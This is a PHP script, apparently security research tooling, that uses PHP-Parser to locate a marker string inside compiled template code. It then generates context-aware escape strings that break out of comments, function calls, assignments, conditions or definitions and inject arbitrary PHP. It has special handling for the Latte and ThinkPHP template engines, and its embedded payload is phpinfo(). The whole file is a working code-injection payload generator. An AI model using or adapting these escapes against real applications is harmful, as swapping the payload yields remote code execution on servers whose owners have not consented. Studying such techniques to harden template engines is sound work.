<?php

require 'vendor/autoload.php';

use PhpParser\Error;
use PhpParser\NodeDumper;
use PhpParser\ParserFactory;
use PhpParser\Lexer;
use PhpParser\Parser\Tokens;

const UNIQUE_STRING = 'Un1QuE';
const EXEC_CODE = <<<'CODE'
phpinfo();
CODE;

const COMMENTS_TOKENS=array(376,377,378,379);
const FUNCTION_CLASS = array('PhpParser\Node\Expr\FuncCall','PhpParser\Node\Expr\StaticCall','PhpParser\Node\Expr\MethodCall');
const SPECIAL_FUNCTION_CLASS = array('PhpParser\Node\Expr\Isset_','PhpParser\Node\Expr\Empty_',);
const COND_CLASS = array('PhpParser\Node\Stmt\While_','PhpParser\Node\Stmt\If_','PhpParser\Node\Stmt\Foreach_');
const FUNCTION_TOKENS=array();
const ASSIGN_TOKENS=array();
const COND_TOKENS=array();
const DEFINE_TOKENS=array();

error_reporting(0);

function isDeclaredUsingVar(array $tokens, PhpParser\Node\Stmt\Property $prop) {
    $i = $prop->getStartTokenPos();
    return $tokens[$i]->id === T_VAR;
}

function get_all_static($className)
{
    $r = new ReflectionClass($className);
    return $r->getProperties();
}


class MyNodeVisitor extends PhpParser\NodeVisitorAbstract {
    private $tokens;
    private $stack;
    private $locationTokens=array();
    private $locationNode=array();
    public function setTokens(array $tokens) {
        $this->tokens = $tokens;
    }

    public function beginTraverse(array $nodes) {
        $this->stack = [];
    }


//add parent Attribute
    public function enterNode(PhpParser\Node $node) {
        if (!empty($this->stack)) {
            $node->setAttribute('parent', $this->stack[count($this->stack)-1]);
        }
        $this->stack[] = $node;
    }

    public function leaveNode(PhpParser\Node $node) {
        if(strstr($node->name,UNIQUE_STRING)){
                $this->locationNode[] = $node;
            }
        array_pop($this->stack);

    }


    public function checkTokens(){
        for($i = 0; $i<sizeof($this->tokens) ; $i++){
            if (strstr($this->tokens[$i][1],UNIQUE_STRING)){
                $this->locationTokens[] = $this->tokens[$i];
            }
        }
    }

    public function getLocationNode(){
        return $this->locationNode;
    }

    public function getEscapeContextTokens(): array
    {
        return $this->locationTokens;
    }
}




class CodeWrapper{
    public $poc_code;
    public $escape_line;
    public $ast_tree;
    public $node_token;
    public $escape_token;
    public $escape_context;
    public $location_node;
    public $escape_node;
    public $template_engine;

    function __construct($template_engine,$poc_code,array $node_token,$location_node,$stmts,$escape_line)
    {   $this->template_engine = $template_engine;
        $this->poc_code=$poc_code;
        $this->node_token=$node_token;
        $this->ast_tree = $stmts;
        $this->escape_line = $escape_line;
        $this->location_node = $location_node;
        $this->identifyContext();
    }

    public function identifyContext(){
        for ($i = 0; $i<sizeof($this->node_token); $i++){
            if ($this->node_token[$i][2] == $this->escape_line or
                $this->node_token[$i][2]+1 == $this->escape_line) {
                $this->escape_token = $this->node_token[$i];
            }
        }

        for ($i = 0; $i<sizeof($this->location_node); $i++){
            if ($this->location_node[$i]->attributes['startLine'] == $this->escape_line) {
                $this->escape_node = $this->location_node[$i];
            }
        }

        if ($this->escape_token){
            if (in_array($this->escape_token[0],COMMENTS_TOKENS)){
                $this->escape_context = 'comments';
                return ;
            }
        }

        if (($this->escape_node instanceof PhpParser\Node\Expr && in_array(get_class($this->escape_node->getAttribute('parent')),COND_CLASS))){
            $this->escape_context = 'cond';
            return ;
        }
        if ($this->escape_node instanceof PhpParser\Node\Expr\Variable &&
            ($this->escape_node->getAttribute('parent') instanceof PhpParser\Node\Arg ||
                ($this->escape_node->getAttribute('parent') instanceof PhpParser\Node\Expr\ArrayDimFetch &&
                    ($this->escape_node->getAttribute('parent')->getAttribute('parent') instanceof PhpParser\Node\Arg)||
                    ($this->escape_node->getAttribute('parent')->getAttribute('parent')->getAttribute('parent') instanceof PhpParser\Node\Arg))
            )){
            $this->escape_context = 'function';
            return ;
        }


        if ($this->escape_node instanceof PhpParser\Node\Expr\Variable && $this->escape_node->getAttribute('parent') instanceof PhpParser\Node\Expr\Ternary &&
            $this->escape_node->getAttribute('parent')->getAttribute('parent') instanceof PhpParser\Node\Arg &&
            in_array(get_class($this->escape_node->getAttribute('parent')->getAttribute('parent')->getAttribute('parent')),FUNCTION_CLASS) ||
            ($this->escape_node instanceof PhpParser\Node\Expr\Variable && (in_array(get_class($this->escape_node->getAttribute('parent')),SPECIAL_FUNCTION_CLASS)||
            in_array(get_class($this->escape_node->getAttribute('parent')),FUNCTION_CLASS)) )){
            $this->escape_context = 'function';
            return ;
            }

        if ($this->escape_node instanceof PhpParser\Node\Expr\Variable &&
            $this->escape_node->getAttribute('parent') instanceof PhpParser\Node\Expr\ArrayDimFetch &&
            $this->escape_node->getAttribute('parent')->getAttribute('parent') instanceof PhpParser\Node\Stmt\Echo_){
            $this->escape_context = 'echofunction';
            return;
            }

        if ($this->escape_node instanceof PhpParser\Node\Expr\Variable && $this->escape_node->getAttribute('parent') instanceof PhpParser\Node\Expr\Assign){
            $this->escape_context = 'assign';
            return ;
        }
        if (($this->escape_node instanceof PhpParser\Node\Expr && in_array(get_class($this->escape_node->getAttribute('parent')),COND_CLASS))){
            $this->escape_context = 'cond';
            return ;
        }
        if ($this->escape_node instanceof  PhpParser\Node\Stmt\Function_ || $this->escape_node instanceof  PhpParser\Node\Stmt\Function_){
            $this->escape_context = 'define';
            return ;
        }
            $this->escape_context = 'UNKNOWN';
            return ;
    }


    public function commentsContextWrapper(){
        if (preg_match("/\/\*([\s\S]*)\*\//",$this->escape_token[1])){
            return str_replace(UNIQUE_STRING, '*/' . EXEC_CODE . '/*', $this->poc_code);
        }

        elseif (preg_match("/\/\/(.*?)/",$this->escape_token[1])){
            return str_replace(UNIQUE_STRING, 'a'.PHP_EOL . EXEC_CODE . '//' , $this->poc_code);
        }
        return 'BAD COMMENTS';
    }

    public function functionContextWrapper(){
        $wrapper_code_left = 'a';
        $wrapper_code_tmp = '';
        $tmp_node = $this->escape_node;
        while (array_key_exists('parent',$tmp_node->attributes) != FALSE){
            $tmp_node = $tmp_node->getAttribute('parent');
            if (in_array(get_class($tmp_node),FUNCTION_CLASS) || in_array(get_class($tmp_node), COND_CLASS) || in_array(get_class($tmp_node),SPECIAL_FUNCTION_CLASS)){
                $wrapper_code_left = $wrapper_code_left.")";
                $wrapper_code_tmp = $wrapper_code_tmp."(";
            }
            elseif (get_class($tmp_node) == 'PhpParser\Node\Expr\Ternary'){
                if (in_array(get_class($tmp_node->cond->expr),FUNCTION_CLASS )){
                    $wrapper_code_left = $wrapper_code_left.")";
                    $wrapper_code_tmp = $wrapper_code_tmp."(";
                }
            }

        }
        if ($this->template_engine == 'latte'){
            $wrapper_code_left = str_replace('a','',$wrapper_code_left);
            if (strstr($this->poc_code,"clamp")  || strstr($this->poc_code,"truncate")){
                $wrapper_code_left = 'a,$b,$c//"'.$wrapper_code_tmp.PHP_EOL.$wrapper_code_left;
            }
            elseif (strstr($this->poc_code,"substr")){
                $wrapper_code_left = 'a,1,1//"'.$wrapper_code_tmp.PHP_EOL.$wrapper_code_left;
            }
            elseif (strstr($this->poc_code,"frequency")){

                $wrapper_code_left = 'a//"'.substr($wrapper_code_tmp,0,strlen($wrapper_code_tmp)-1).PHP_EOL.substr($wrapper_code_left,1,strlen($wrapper_code_left)-1);
            }
            else{
                $wrapper_code_left = 'a//"'.$wrapper_code_tmp.PHP_EOL.$wrapper_code_left;
            }
//             $wrapper_code_left = 'a//"'.substr($wrapper_code_tmp,0,strlen($wrapper_code_tmp)-1).PHP_EOL.substr($wrapper_code_left,0,strlen($wrapper_code_left)-1);
            $wrapper_code_left = $wrapper_code_left.";";
            return str_replace(UNIQUE_STRING,$wrapper_code_left.EXEC_CODE.'/*"',$this->poc_code);
        }
        if (($this->template_engine == 'thinkphp') && (strstr($this->poc_code,"{in") || strstr($this->poc_code,"{notin")
         || strstr($this->poc_code,"{notempty"))){
            $wrapper_code_left = $wrapper_code_left.")";
        }
        $wrapper_code_left = $wrapper_code_left.";";
        $wrapper_code = $wrapper_code_left.EXEC_CODE."/*";
        return str_replace(UNIQUE_STRING,$wrapper_code,$this->poc_code);
    }

    public function echofunctionContextWrapper(){
        $wrapper_code_left = 'a';
        $wrapper_code_tmp = '';
        $wrapper_code_left = $wrapper_code_left.";";
        $wrapper_code = $wrapper_code_left.EXEC_CODE."/*";
        $tmp_node = $this->escape_node;
        return str_replace(UNIQUE_STRING,$wrapper_code,$this->poc_code);
    }

    public function assignContextWrapper(){
        $wrapper_code_left = 'a';
        $wrapper_code_tmp = '';
        $tmp_node = $this->escape_node;

        $wrapper_code_left = $wrapper_code_left."=1";
         while (array_key_exists('parent',$tmp_node->attributes) != FALSE){
            $tmp_node = $tmp_node->getAttribute('parent');
            if (in_array(get_class($tmp_node),FUNCTION_CLASS) || in_array(get_class($tmp_node), COND_CLASS) || in_array(get_class($tmp_node),SPECIAL_FUNCTION_CLASS)){
                $wrapper_code_left = $wrapper_code_left.")";
                $wrapper_code_tmp = $wrapper_code_tmp."(";
            }
            elseif (get_class($tmp_node) == 'PhpParser\Node\Expr\Ternary'){
                if (in_array(get_class($tmp_node->cond->expr),FUNCTION_CLASS )){
                    $wrapper_code_left = $wrapper_code_left.")";
                    $wrapper_code_tmp = $wrapper_code_tmp."(";
                }
            }

        }
        if ($this->template_engine == 'thinkphp' && strstr($this->poc_code,"volist")){
            $wrapper_code_left = $wrapper_code_left.")";
        }
        $wrapper_code = $wrapper_code_left.";".EXEC_CODE."/*";

        if ($this->template_engine == 'latte'){
        $wrapper_code_left = str_replace("=1","",$wrapper_code_left);
        $wrapper_code_left = str_replace('a','',$wrapper_code_left);
            $wrapper_code_left = 'a//"'.$wrapper_code_tmp.PHP_EOL.$wrapper_code_left.";";
            $wrapper_code = $wrapper_code_left.EXEC_CODE.'/*"';
        }
        return str_replace(UNIQUE_STRING,$wrapper_code,$this->poc_code);
    }

    public function condContextWrapper(){
        $wrapper_code_left = 'a';
        $wrapper_code_tmp = '';
        $tmp_node = $this->escape_node;
        if (strstr($this->poc_code,"{foreach")){
                    $wrapper_code_left = ' as $b';
        }
        while (array_key_exists('parent',$tmp_node->attributes) != FALSE) {
            $tmp_node = $tmp_node->getAttribute('parent');
            if (in_array(get_class($tmp_node), FUNCTION_CLASS) || in_array(get_class($tmp_node), COND_CLASS)) {
                $wrapper_code_left = $wrapper_code_left . ")";
                $wrapper_code_tmp = $wrapper_code_tmp . "(";
            }
        }
        if ($this->template_engine == 'latte'){
            $wrapper_code_left = substr($wrapper_code_left,0,strlen($wrapper_code_left)-1);
            $wrapper_code_left = 'a//"'.$wrapper_code_tmp.PHP_EOL.$wrapper_code_left;
            $wrapper_code_left = $wrapper_code_left.";";
            return str_replace(UNIQUE_STRING,$wrapper_code_left.EXEC_CODE.'/*"',$this->poc_code);
        }
        $wrapper_code_left = $wrapper_code_left.";";
        $wrapper_code = $wrapper_code_left.EXEC_CODE."/*";
        return str_replace(UNIQUE_STRING,$wrapper_code,$this->poc_code);
    }

    public function defineContextWrapper(){
        $wrapper_code_left = 'a';
        $wrapper_code_tmp = '';
        if ($this->escape_node instanceof PhpParser\Node\Stmt\Function_){
            $wrapper_code_left = $wrapper_code_left."(){};";
            $wrapper_code = $wrapper_code_left.EXEC_CODE."function ";
        }
        return str_replace(UNIQUE_STRING,$wrapper_code,$this->poc_code);
    }

    public function getWrapperCode(): string
    {
        if ($this->escape_context!='UNKNOWN'){
            $func_name = $this->escape_context.'ContextWrapper';
            return $this->$func_name();
        }
        return 'Unknown Context!';
    }
}


$lexer = new PhpParser\Lexer(array(
    'usedAttributes' => array(
        'comments', 'startLine', 'endLine', 'startTokenPos', 'endTokenPos'
    )
));
$parser = (new PhpParser\ParserFactory)->create(PhpParser\ParserFactory::ONLY_PHP7, $lexer);
$visitor = new MyNodeVisitor();
$traverser = new PhpParser\NodeTraverser();
$traverser->addVisitor($visitor);



if ($argc == 5){
    $filename = $argv[1];
    $escape_line = $argv[2];
    $template_engine = $argv[3];
    $poc_code = $argv[4];
}
else{
    die("Args Error!");
}


try {
    $code = file_get_contents($filename);
    $stmts = $parser->parse($code);
    $visitor->setTokens($lexer->getTokens());
    $stmts = $traverser->traverse($stmts);
    $visitor->checkTokens();
    $node_token = $visitor->getEscapeContextTokens();
    $location_node = $visitor->getLocationNode();
    $s = new CodeWrapper($template_engine,$poc_code,$node_token,$location_node,$stmts,$escape_line);
    echo ($s->getWrapperCode());
} catch (PhpParser\Error $e) {
    echo 'Parse Error: ', $e->getMessage();
}








